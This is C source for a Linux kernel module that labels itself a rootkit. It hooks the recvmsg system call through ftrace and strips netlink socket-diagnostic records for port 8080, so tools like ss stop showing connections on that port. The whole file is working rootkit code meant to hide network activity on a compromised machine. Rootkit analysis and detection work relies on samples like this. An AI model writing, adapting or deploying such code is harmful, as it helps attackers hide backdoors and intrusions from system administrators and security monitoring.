#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/tcp.h>
#include <linux/inet_diag.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("h1zzz");
MODULE_DESCRIPTION("Hiding open ports");
MODULE_VERSION("0.01");

static asmlinkage long (*orig_recvmsg)(int fd, struct user_msghdr __user *msg,
                                       unsigned flags);

static asmlinkage long hook_recvmsg(int fd, struct user_msghdr __user *msg,
                                    unsigned flags)
{
    struct user_msghdr msg_ker;
    long ret, err;
    int i, n, found, count, offset;
    int iov_len;
    struct iovec iov;
    void *iov_base;
    struct nlmsghdr *nlh;
    struct inet_diag_msg *r;
    char *stream;
	unsigned short port = htons(8080);

    if (flags & MSG_CMSG_COMPAT)
        return -EINVAL;

    ret = orig_recvmsg(fd, msg, flags);
    if (ret <= 0)
        return ret;

    count = ret;

    err = _copy_from_user(&msg_ker, msg, sizeof(struct user_msghdr));
    if (err)
        return ret;

    for (i = 0; i < msg_ker.msg_iovlen; i++) {
        err = _copy_from_user(&iov, &msg_ker.msg_iov[i], sizeof(struct iovec));
        if (err)
            return ret;

        if (iov.iov_len <= 0)
            continue;

        iov_len = iov.iov_len;

        iov_base = kzalloc(iov.iov_len, GFP_KERNEL);
        if (!iov_base)
            return ret;

        err = _copy_from_user(iov_base, iov.iov_base, iov.iov_len);
        if (err)
            return ret;

        found = 1;
        nlh = (struct nlmsghdr *)iov_base;

        while (NLMSG_OK(nlh, count)) {
            if (found == 0)
                nlh = NLMSG_NEXT(nlh, count);

            r = NLMSG_DATA(nlh);

            if (r->id.idiag_sport != port && r->id.idiag_dport != port) {
                found = 0;
                continue;
            }

            offset = NLMSG_ALIGN((nlh)->nlmsg_len);

            /* msg_iov=[{iov_base={{len=20, type=NLMSG_DONE, flags=NLM_F_MULTI,
             * seq=123456, pid=10466}, 0}, iov_len=20}] */
            if ((iov_len - offset) == 0) {
                nlh->nlmsg_len = 20;
                nlh->nlmsg_type = NLMSG_DONE;
                nlh->nlmsg_flags |= NLM_F_MULTI;
                nlh->nlmsg_seq = 123456;
                break;
            }

            found = 1;
            stream = (char *)nlh;

            for (n = 0; n < count; n++)
                stream[n] = stream[n + offset];

            ret -= offset;
            iov_len -= offset;
        }

        err = _copy_to_user(iov.iov_base, iov_base, iov.iov_len);
        if (err)
            return ret;

        iov.iov_len = iov_len;
        kfree(iov_base);

        err = _copy_to_user(&msg_ker.msg_iov[i], &iov, sizeof(struct iovec));
        if (err)
            return ret;
    }

    err = _copy_to_user(msg, &msg_ker, sizeof(struct user_msghdr));
    if (err)
        return ret;

    return ret;
}

/* We are going to use the fh_install_hooks() function from ftrace_helper.h
 * in the module initialization function. This function takes an array of
 * ftrace_hook structs, so we initialize it with what we want to hook
 * */
static struct ftrace_hook hooks[] = {
    HOOK("sys_recvmsg", hook_recvmsg, &orig_recvmsg),
};

/* Module initialization function */
static int __init rootkit_init(void)
{
    /* Simply call fh_install_hooks() with hooks (defined above) */
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
        return err;

    printk(KERN_INFO "rootkit: Loaded >:-)\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    /* Simply call fh_remove_hooks() with hooks (defined above) */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
